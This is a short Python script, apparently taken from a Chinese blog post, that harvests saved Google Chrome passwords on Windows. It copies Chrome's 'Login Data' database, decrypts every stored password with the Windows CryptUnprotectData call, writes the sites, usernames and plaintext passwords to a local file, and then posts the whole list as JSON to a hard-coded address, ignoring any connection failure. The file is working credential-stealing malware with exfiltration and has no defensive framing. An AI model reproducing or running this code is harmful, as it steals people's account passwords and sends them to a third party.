#https://blog.csdn.net/MC_XY/article/details/120368801?utm_medium=distribute.pc_category.none-task-blog-hot-5.nonecase&depth_1-utm_source=distribute.pc_category.none-task-blog-hot-5.nonecase
import os
import shutil
import sqlite3
import win32crypt
import json
import requests

APP_DATA_PATH = os.environ["LOCALAPPDATA"]
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

class ChromePassword:

    def __init__(self):
        self.passwordList = []
    
    def get_Chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _tmp_file = os.path.join(os.environ["LOCALAPPDATA"],'sqlite_file')
        if os.path.exists(_tmp_file):
            os.remove(_tmp_file)
        shutil.copyfile(_full_path, _tmp_file)
        self.show_password(_tmp_file)

    def show_password(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = '''select signon_realm,username_value,password_value from logins'''
        for row in conn.execute(_sql):
            try:
                ret = win32crypt.CryptUnprotectData(row[2], None, None, None,0)
            except Exception as e:
                pass
            _info = 'url: %-50s username: %-20s password: %s\n' % \
                (row[0][:50], row[1], ret[1].decode())
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def save_passwords(self):
        with open('password.txt', 'w',encoding='utf8') as f:
            f.writelines(self.passwordList)
    
    def transfer_passwords(self):
        try:
            requests.post('http://192.168.1.7/index',
            data=json.dumps(self.passwordList))
        except requests.exceptions.ConnectionError:
            pass
if __name__ == '__main__':
    Main = ChromePassword()
    Main.get_Chrome_db()
    Main.save_passwords()
    Main.transfer_passwords()
